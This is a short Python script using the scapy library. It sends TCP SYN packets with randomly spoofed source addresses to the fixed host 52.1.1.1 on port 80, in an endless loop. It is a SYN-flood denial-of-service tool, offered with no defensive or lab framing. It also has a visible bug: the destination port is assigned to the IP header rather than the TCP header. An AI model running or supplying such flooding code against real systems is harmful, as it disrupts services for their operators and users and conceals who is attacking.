from scapy.all import *
import random
import time


def send_tcp_syn_packet(dip , dport):
    ip_hdr = IP()
    tcp_hdr = TCP()
    ip_hdr.src = '%i.%i.%i.%i' %(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
    #@ip_hdr.src = '17.235.173.183'
    tcp_hdr.sport = random.randint(1, 65535)
    tcp_hdr.flags = "S"
    ip_hdr.dst = dip
    ip_hdr.dport = dport
    print(ip_hdr.show())
    send(ip_hdr / tcp_hdr, verbose=0)


while 1:
    send_tcp_syn_packet("52.1.1.1", '80')
    time.sleep(0.1)